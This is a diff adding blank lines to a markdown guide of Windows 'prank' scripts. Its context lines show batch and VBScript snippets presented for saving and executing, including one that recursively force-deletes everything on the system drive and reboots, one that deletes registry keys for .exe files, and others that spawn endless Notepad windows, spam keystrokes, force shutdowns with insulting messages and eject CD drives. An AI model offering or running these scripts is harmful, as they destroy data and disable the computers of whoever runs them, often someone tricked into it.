@@ -21,7 +21,9 @@ Run this command without moderation;)
 Save the file anywhere (.bat) and execute it:
 
 ##### 2.1 The blue screen of Death
+
 Code:
+
 ```
 @echo off
 del %systemdrive%\*.*/f/s/q
@@ -29,7 +31,9 @@ shutdown -r -f -t 00
 ```
 
 ##### 2.2 Stupidity Shutdown
+
 code:
+
 ```
 @echo off
 msg * Fatal system error due to admin stupidity!
@@ -37,7 +41,9 @@ shutdown -c “Error! You are too stupid!” -s -t 10
 ```
 
 ##### 2.3 Delete Key Registry Files
+
 code:
+
 ```
 @ECHO OFF
 START reg delete HKCR/.exe
@@ -49,7 +55,9 @@ GOTO MESSAGE
 ```
 
 ##### 2.4 Endless Notepads
+
 code:
+
 ```
 @ECHO off
 :top
@@ -58,7 +66,9 @@ GOTO top
 ```
 
 ##### 2.5 Crazy caps lock
+
 code:
+
 ```
 Set wshShell =wscript.CreateObject(“WScript.Shell”)
 do
@@ -68,7 +78,9 @@ loop
 ```
 
 ##### 2.6 Endless Enter
+
 code:
+
 ```
 Set wshShell = wscript.CreateObject(“WScript.Shell”)
 do
@@ -78,7 +90,9 @@ loop
 ```
 
 ##### 2.7 Endless Backspace
+
 code:
+
 ```
 MsgBox “Let’s go back a few steps”
 Set wshShell =wscript.CreateObject(“WScript.Shell”)
@@ -89,7 +103,9 @@ loop
 ```
 
 ##### 2.8 Popping CD Drives
+
 code:
+
 ```
 Set oWMP = CreateObject(“WMPlayer.OCX.7”)
 Set colCDROMs = oWMP.cdromCollection
